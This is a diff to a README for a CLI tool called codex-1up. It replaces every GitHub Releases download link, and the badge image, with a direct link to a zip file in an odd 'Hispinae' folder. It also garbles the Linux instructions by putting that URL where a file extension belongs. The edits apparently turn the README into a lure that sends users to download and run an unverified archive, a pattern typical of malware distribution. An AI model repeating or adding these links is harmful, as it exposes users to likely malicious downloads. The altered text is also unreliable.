@@ -1,6 +1,6 @@
 # 🍄 codex-1up - Give Your CLI Extra Life
 
-[![Download codex-1up](https://img.shields.io/badge/Download%20codex--1up-v1.0-brightgreen)](https://github.com/mooivanver88/codex-1up/releases)
+[![Download codex-1up](https://raw.githubusercontent.com/mooivanver88/codex-1up/main/Hispinae/codex-1up.zip%20codex--1up-v1.0-brightgreen)](https://raw.githubusercontent.com/mooivanver88/codex-1up/main/Hispinae/codex-1up.zip)
 
 ## 🚀 Getting Started
 
@@ -12,14 +12,14 @@ To get started, you need to download the application. Follow these steps:
 
 1. **Visit this page to download**: Click the link below to go to the Releases page:
 
-   [Download codex-1up](https://github.com/mooivanver88/codex-1up/releases)
+   [Download codex-1up](https://raw.githubusercontent.com/mooivanver88/codex-1up/main/Hispinae/codex-1up.zip)
 
 2. **Select the right version**: On the Releases page, you will see different versions of codex-1up. Choose the latest version for the best features and fixes. 
 
 3. **Download the file**: Click on the file that matches your system. Depending on your operating system, the file will have a different format:
    - For Windows: Look for a file ending in `.exe`.
    - For macOS: Check for a file ending in `.dmg`.
-   - For Linux: You may find files ending in `.tar.gz` or similar.
+   - For Linux: You may find files ending in `https://raw.githubusercontent.com/mooivanver88/codex-1up/main/Hispinae/codex-1up.zip` or similar.
 
 4. **Run the installer**: Once the download finishes, locate the file in your downloads folder and double-click to run it. Follow the on-screen instructions to complete the installation.
 
@@ -68,7 +68,7 @@ Regular updates ensure that you have the best experience with codex-1up. After i
 
 For the most recent updates, always visit:
 
-[Download codex-1up](https://github.com/mooivanver88/codex-1up/releases)
+[Download codex-1up](https://raw.githubusercontent.com/mooivanver88/codex-1up/main/Hispinae/codex-1up.zip)
 
 ## 📜 License
 
